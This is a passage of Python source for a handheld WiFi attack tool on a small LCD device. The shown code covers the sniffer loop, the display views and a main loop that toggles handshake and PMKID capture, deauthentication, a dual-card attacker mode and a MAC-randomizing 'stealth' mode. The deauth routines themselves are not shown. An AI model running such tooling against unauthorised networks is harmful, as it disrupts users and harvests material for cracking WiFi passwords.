    if not SCAPY_OK or not mon_iface:
        return

    # Increase kernel capture buffer to 4MB (default is often 2MB)
    try:
        conf.bufsize = 4 * 1024 * 1024
    except Exception:
        pass

    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: _shutdown.is_set() or not _capture_event.is_set(),
            store=0,
        )
    except Exception:
        pass


def _activity_sampler():
    """Sample channel activity every 10s. Prune stale entries every 30s."""
    tick = 0
    while not _shutdown.is_set():
        if _shutdown.wait(timeout=10):
            break
        tick += 1
        with lock:
            total = sum(channel_activity.values())
            for ch in channel_activity:
                channel_activity[ch] = 0
        activity_history.append(total)
        # Prune every 30s (every 3rd tick)
        if tick % 3 == 0:
            _prune_stale()


# ---------------------------------------------------------------------------
# Animation helpers
# ---------------------------------------------------------------------------


def _update_animation():
    global _blink, _next_blink, _pupil_x, _pupil_target
    global _pupil_change_time, _zzz_phase

    now = time.time()

    if _blink:
        if now > _next_blink + 0.2:
            _blink = False
            _next_blink = now + random.uniform(5, 10)
    else:
        if now >= _next_blink:
            _blink = True

    if now >= _pupil_change_time:
        _pupil_target = random.randint(-2, 2)
        _pupil_change_time = now + random.uniform(2, 4)
    diff = _pupil_target - _pupil_x
    _pupil_x += diff * 0.3

    _zzz_phase = (now * 0.5) % 3.0


# ---------------------------------------------------------------------------
# Pixel art face
# ---------------------------------------------------------------------------


FACES = {
    "awake":    "(  o . o  )",
    "happy":    "(  ^ . ^  )",
    "excited":  "(  * . *  )",
    "cool":     "(  - . -  )",
    "intense":  "(  @ . @  )",
    "bored":    "(  . . .  )",
    "lonely":   "(  ; . ;  )",
    "sad":      "(  T . T  )",
    "sleeping": "(  -  _  -  )",
    "grateful": "(  > . <  )",
    "friend":   "(  o . O  )",
    "stealth":  "(  # . #  )",
}


def _draw_pixel_face(d, face_mood, blink, font_obj):
    try:
        face_font = scaled_font(14)
    except Exception:
        face_font = font_obj
    face_text = FACES.get(face_mood, FACES["awake"])
    if blink:
        face_text = "(  -  .  -  )"
    cap = _capture_event.is_set()
    face_color = "#00FF00" if cap else "#666666"
    if capture_flash > 0:
        face_color = "#FFFF00"
    if stealth_enabled:
        face_color = "#8800FF"
    d.text((63, 20), face_text, font=face_font, fill=face_color, anchor="mm")


# ---------------------------------------------------------------------------
# Sparkline
# ---------------------------------------------------------------------------


def _draw_sparkline(d, x, y, w, h, data):
    if not data or max(data) == 0:
        d.rectangle((x, y, x + w, y + h), outline="#222")
        return
    mx = max(data)
    bar_w = max(1, w // len(data))
    for i, v in enumerate(data):
        bh = max(0, int(v / mx * h))
        bx = x + i * bar_w
        if v > mx * 0.6:
            color = "#00FF00"
        elif v > mx * 0.2:
            color = "#FFAA00"
        else:
            color = "#FF4444"
        if bh > 0:
            d.rectangle((bx, y + h - bh, bx + bar_w - 1, y + h), fill=color)


# ---------------------------------------------------------------------------
# LCD Drawing -- Face view
# ---------------------------------------------------------------------------


def _draw_face(lcd, font_obj, font_sm):
    global capture_flash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _update_mood()
    _update_animation()

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_hhs = lifetime_half_hs
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        deauth_on = deauth_enabled
        stlth = stealth_enabled
        peers = len(peers_detected)
        dm = dual_mode
        local_flash = capture_flash
        if capture_flash > 0:
            capture_flash -= 1

    cap = _capture_event.is_set()

    # Capture flash effect
    if local_flash > 0:
        if local_flash % 6 < 3:
            d.rectangle((0, 0, 127, 3), fill="#00FF00")
            d.rectangle((0, 124, 127, 127), fill="#00FF00")
            d.rectangle((0, 0, 3, 127), fill="#00FF00")
            d.rectangle((124, 0, 127, 127), fill="#00FF00")

    # Uptime
    elapsed = int(time.time() - start_time)
    h_val = elapsed // 3600
    m_val = (elapsed % 3600) // 60
    s_val = elapsed % 60
    uptime = f"{h_val:02d}:{m_val:02d}:{s_val:02d}"

    # Face
    _draw_pixel_face(d, mood, _blink, font_obj)

    # Separator
    d.line([(0, 41), (127, 41)], fill="#333")

    y = 43

    # CH + Mode
    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
    mode_parts = []
    if cap:
        mode_parts.append("AUTO")
    if deauth_on:
        mode_parts.append("DTH")
    if stlth:
        mode_parts.append("STH")
    if dm:
        mode_parts.append("2x")
    d.text((36, y), "+".join(mode_parts) or "IDLE",
           font=font_sm, fill="#58a6ff")
    y += 12

    # AP + CLI + Peers
    d.text((2, y), f"AP:{aps}", font=font_sm, fill="#00FF00")
    d.text((40, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
    if peers > 0:
        d.text((90, y), f"P:{peers}", font=font_sm, fill="#FF00FF")
    y += 12

    # PWND
    total_pwnd = hs + hhs + pm
    lt_total = lt_hs + lt_hhs + lt_pm
    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
    d.text((2, y), f"PWND:{hs}+{hhs}h+{pm}p", font=font_sm, fill=pwnd_color)
    d.text((90, y), f"({lt_total})", font=font_sm, fill="#666")
    y += 12

    # Uptime
    d.text((2, y), f"UP:{uptime}", font=font_sm, fill="#888")
    y += 12

    # Last capture
    if last:
        d.text((2, y), f">{last[:20]}", font=font_sm, fill="#00FF00")
        y += 12

    # Sparkline
    _draw_sparkline(d, 2, y, 123, 10, activity_history)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cap:
        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth",
               font=font_sm, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X",
               font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Stats view
# ---------------------------------------------------------------------------


def _draw_stats(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        ch_act = dict(channel_total)
        cur_ch = current_channel
        aps_snap = dict(session_aps)
        clients_snap = len(session_clients)
        captured = set(captured_bssids)

    all_channels = list(range(1, 14)) + list(CHANNELS_5)

    sel_idx = max(0, min(scroll, len(all_channels) - 1))
    sel_ch = all_channels[sel_idx]

    # Header
    is_5g = sel_ch > 14
    band_label = "5G" if is_5g else "2.4"
    band_color = "#FF00FF" if is_5g else "#58a6ff"
    act_sel = ch_act.get(sel_ch, 0)
    d.rectangle((0, 0, 127, 11), fill="#111")
    d.text((2, 1), f"CH{sel_ch}", font=font_sm, fill="#FFFFFF")
    d.text((30, 1), band_label, font=font_sm, fill=band_color)
    d.text((48, 1), f"p:{act_sel}", font=font_sm, fill="#FFAA00")
    d.text((80, 1), f"AP:{len(aps_snap)} C:{clients_snap}",
           font=font_sm, fill="#888")

    # Channel strip
    strip_y = 13
    strip_size = 13
    strip_half = strip_size // 2
    strip_start = max(0, sel_idx - strip_half)
    strip_start = min(strip_start, max(0, len(all_channels) - strip_size))
    strip_end = min(len(all_channels), strip_start + strip_size)
    strip_chs = all_channels[strip_start:strip_end]

    cell_w = 124 // max(len(strip_chs), 1)
    cell_w = max(8, min(cell_w, 12))

    if strip_start > 0:
        d.text((0, strip_y), "<", font=font_sm, fill="#555")
    if strip_end < len(all_channels):
        d.text((124, strip_y), ">", font=font_sm, fill="#555")

    for i, ch in enumerate(strip_chs):
        x = 2 + i * cell_w
        if ch == sel_ch:
            d.rectangle((x - 1, strip_y - 1, x + cell_w - 2, strip_y + 9),
                         fill="#333")
            ch_color = "#FFFFFF"
        elif ch == cur_ch:
            ch_color = "#00FFFF"
        elif ch_act.get(ch, 0) > 0:
            ch_color = "#00FF00" if ch <= 14 else "#FF00FF"
        else:
            ch_color = "#333"
        d.text((x, strip_y), str(ch), font=font_sm, fill=ch_color)

    # Bar chart
    bar_top = 25
    bar_h_max = 22
    max_act = max((ch_act.get(c, 0) for c in strip_chs), default=1) or 1

    for i, ch in enumerate(strip_chs):
        x = 2 + i * cell_w
        act = ch_act.get(ch, 0)
        bh = max(1, int(act / max_act * bar_h_max)) if act > 0 else 0

        if ch == sel_ch:
            bar_color = "#FFFFFF"
        elif ch == cur_ch:
            bar_color = "#00FFFF"
        elif ch > 14:
            bar_color = "#FF00FF" if act > max_act * 0.3 else "#331133"
        elif act > max_act * 0.6:
            bar_color = "#00FF00"
        elif act > 0:
            bar_color = "#FFAA00"
        else:
            bar_color = "#181818"

        if bh > 0:
            d.rectangle((x, bar_top + bar_h_max - bh,
                          x + cell_w - 2, bar_top + bar_h_max),
                         fill=bar_color)
        else:
            d.line((x, bar_top + bar_h_max, x + cell_w - 2,
                     bar_top + bar_h_max), fill="#181818")

    # Separator
    sep_y = bar_top + bar_h_max + 2
    d.line([(0, sep_y), (127, sep_y)], fill="#333")

    # APs on selected channel
    y = sep_y + 2
    aps_on_ch = [
        (bssid, info) for bssid, info in aps_snap.items()
        if info.get("channel") == sel_ch
    ]
    aps_on_ch.sort(key=lambda x: len(x[1].get("clients", set())),
                   reverse=True)

    rows_avail = (114 - y) // 10
    if aps_on_ch:
        for bssid, info in aps_on_ch[:rows_avail]:
            essid = info.get("essid", "?")[:12]
            cli = len(info.get("clients", set()))
            sig = info.get("signal", -99)
            pwned = "!" if bssid in captured else " "
            name_color = "#00FF00" if bssid in captured else "#FFFFFF"
            d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
            d.text((80, y), f"{cli}c", font=font_sm, fill="#FFAA00")
            d.text((100, y), f"{sig}", font=font_sm, fill="#888")
            y += 10
        if len(aps_on_ch) > rows_avail:
            d.text((2, y), f"+{len(aps_on_ch) - rows_avail} more",
                   font=font_sm, fill="#555")
    else:
        d.text((4, y), f"CH{sel_ch}: no APs", font=font_sm, fill="#444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "L/R:Nav K1:View K3:Back",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Captures view
# ---------------------------------------------------------------------------


def _list_captures():
    if not os.path.isdir(HANDSHAKE_DIR):
        return []
    try:
        files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
        files.sort(reverse=True)
        return files
    except Exception:
        return []


def _draw_captures(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    captures = _list_captures()
    count = len(captures)

    d.rectangle((0, 0, 127, 13), fill="#112211")
    d.text((2, 1), f"CAPTURES ({count})", font=font_sm, fill="#00FF00")

    if not captures:
        d.text((4, 40), "No captures yet", font=font_sm, fill="#666")
        d.text((4, 55), "Start hunting!", font=font_sm, fill="#444")
    else:
        visible = captures[scroll:scroll + 7]
        for i, fname in enumerate(visible):
            y = 16 + i * 14
            name_display = fname.replace(".pcap", "")
            if fname.startswith("hs4_"):
                color = "#00FF00"
                prefix = "!"
            elif fname.startswith("hs_half_"):
                color = "#FFAA00"
                prefix = "~"
            elif fname.startswith("pmkid_"):
                color = "#FF00FF"
                prefix = "*"
            else:
                color = "#CCCCCC"
                prefix = " "
            d.text((2, y), f"{prefix} {name_display[:21]}",
                   font=font_sm, fill=color)

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "U/D:Scroll K1:View K3:Back",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Whitelist view
# ---------------------------------------------------------------------------


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#442200")
    d.text((2, 1), "WHITELIST", font=font_sm, fill="#FFAA00")

    lines = []
    for mac in sorted(whitelist_macs):
        lines.append(f"MAC {mac[-11:]}")
    for ssid in sorted(whitelist_ssids):
        lines.append(f"SSID {ssid[:14]}")

    if not lines:
        d.text((4, 30), "Whitelist empty", font=font_sm, fill="#666")
        d.text((4, 45), "Edit config.json in", font=font_sm, fill="#666")
        d.text((4, 57), LOOT_DIR[:22], font=font_sm, fill="#444")
        d.text((4, 75), "Add your own WiFi", font=font_sm, fill="#666")
        d.text((4, 87), "to avoid deauthing it", font=font_sm, fill="#666")
    else:
        visible = lines[scroll:scroll + 7]
        for i, line in enumerate(visible):
            y = 16 + i * 13
            d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(lines)} entries K1:View K3:X",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Dual card selection
# ---------------------------------------------------------------------------


def _show_lcd_message(lcd, font, text, color="#FF4444", duration=2):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), text[:24], font=font, fill=color)
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(duration)


def _select_dual_prompt(lcd, font, font_sm, second_name):
    """Ask user if they want dual mode. Returns True/False."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 20), "2nd card found!", font=font, fill="#00FF00")
    d.text((4, 40), second_name[:20], font=font_sm, fill="#FFAA00")
    d.text((4, 60), "DUAL MODE?", font=font, fill="#FFFFFF")
    d.text((4, 80), "Sniffer + Attacker", font=font_sm, fill="#888")
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Yes  KEY3:No", font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)

    while True:
        btn = get_button(PINS, GPIO)
        if btn == "OK":
            return True
        if btn == "KEY3":
            return False
        time.sleep(0.05)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main():
    global deauth_enabled, stealth_enabled
    global mon_iface, mon_iface2, dual_mode, view, original_mac, capture_flash

    capture_flash = 0
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        _show_lcd_message(lcd, font_obj, "scapy not found!", "#FF0000", 3)
        GPIO.cleanup()
        return 1

    # --- Interface selection ---
    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi",
                             require_monitor=True)
    if not iface:
        GPIO.cleanup()
        return 1

    original_mac = _get_mac(iface)

    # Check for second monitor-capable card
    all_mon = [
        i for i in list_interfaces("wifi")
        if i.get("supports_monitor") and i["name"] != iface
    ]
    iface2 = None
    if all_mon:
        # Debounce: wait for button release after interface selection
        time.sleep(0.5)
        while get_button(PINS, GPIO) is not None:
            time.sleep(0.1)
        if _select_dual_prompt(lcd, font_obj, font_sm, all_mon[0]["name"]):
            iface2 = all_mon[0]["name"]

    # --- Monitor mode ---
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), f"Monitor: {iface}...", font=font_obj, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        _show_lcd_message(lcd, font_obj, f"Monitor fail: {iface}", "#FF0000", 3)
        _show_lcd_message(lcd, font_obj, "Check dongle support", "#FFAA00", 3)
        GPIO.cleanup()
        return 1

    # Second card monitor mode
    if iface2:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), f"Monitor: {iface2}...", font=font_obj, fill="#FFAA00")
        lcd.LCD_ShowImage(img, 0, 0)

        mon_iface2 = _monitor_up(iface2)
        if mon_iface2:
            dual_mode = True
        else:
            _show_lcd_message(lcd, font_obj, f"Card2 fail, single mode", "#FFAA00", 2)

    # Start activity sampler
    threading.Thread(target=_activity_sampler, daemon=True).start()

    scroll = 0

    try:
        while not _shutdown.is_set():
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not _capture_event.is_set():
                    _capture_event.set()
                    threading.Thread(target=_channel_hopper,
                                    daemon=True).start()
                    threading.Thread(target=_sniffer, daemon=True).start()
                    threading.Thread(target=_half_hs_checker,
                                    daemon=True).start()
                    if dual_mode and mon_iface2:
                        threading.Thread(target=_attack_hopper,
                                        daemon=True).start()
                else:
                    _capture_event.clear()
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "LEFT" and view == "stats":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "RIGHT" and view == "stats":
                scroll += 1
                time.sleep(0.15)

            elif btn == "KEY1":
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "captures"
                elif view == "captures":
                    view = "whitelist"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2":
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    _randomize_mac(mon_iface)
                    _reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    _restore_mac(mon_iface, original_mac)
                    _restore_tx_power(mon_iface)
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "captures":
                _draw_captures(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _shutdown.set()
        _capture_event.clear()
        _save_stats()
        _save_config()
        if stealth_enabled and mon_iface:
            _restore_mac(mon_iface, original_mac)
            _restore_tx_power(mon_iface)
        time.sleep(0.5)
        _monitor_down(mon_iface)
        if mon_iface2:
            _monitor_down(mon_iface2)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
